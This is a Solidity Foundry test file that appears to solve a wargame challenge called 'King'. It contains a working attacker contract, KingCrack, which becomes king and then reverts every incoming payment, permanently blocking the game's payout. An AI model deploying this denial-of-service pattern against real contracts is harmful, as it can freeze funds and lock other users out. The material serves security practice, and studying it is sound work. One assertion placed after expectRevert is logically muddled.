pragma solidity >=0.6.0 <0.9.0;
import "forge-std/Test.sol";
import {King} from "../src/09-king.sol";

// transfer can return false, make the exchange impossible
contract King09Test is Test {
    King king;
    KingCrack kingcrack;

    function setUp() public {
        emit log_string("🧪 Setup KingTest...");
        king = new King();
        emit log_named_address("King is:", king._king());
        emit log_named_uint("Prize is:", king.prize());
    }

    function testKing() public {
        emit log_string("🧪 Cracking King...");

        address bob = mkaddr("bob");
        vm.deal(bob, 100 ether);
        vm.startPrank(bob);
        kingcrack = new KingCrack();
        (bool success, ) = address(kingcrack).call.value(3 ether)("");
        kingcrack.lock(true);
        kingcrack.depositInKing(address(king));
        emit log_named_address("King is:", king._king());
        emit log_named_uint("Prize is:", king.prize());
        vm.stopPrank();
        emit log_string("🧪 Try to exchange king...");
        address alice = mkaddr("alice");
        vm.deal(alice, 100 ether);
        vm.startPrank(alice);
        vm.expectRevert(bytes("Locked! Cannot deposit!"));
        (success, ) = address(king).call.value(2 ether)("");
        // if return true, assert
        assertTrue(success, "expectRevert: call did not revert");
        vm.stopPrank();
        emit log_named_address("King is:", king._king());
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }

    receive() external payable {}
}

contract KingCrack {
    address public owner;
    bool private locked;

    constructor() public {
        owner = msg.sender;
        locked = false;
    }

    receive() external payable {
        if (locked == true) {
            revert("Locked! Cannot deposit!");
        }
    }

    function lock(bool _lock) public {
        if (msg.sender == owner) {
            locked = _lock;
        }
    }

    function depositInKing(address _addr) public {
        if (msg.sender == owner) {
            (bool success, ) = address(_addr).call.value(1 ether)("");
            if (success == false) {
                revert("Cannot deposit in king...");
            }
        }
    }
}
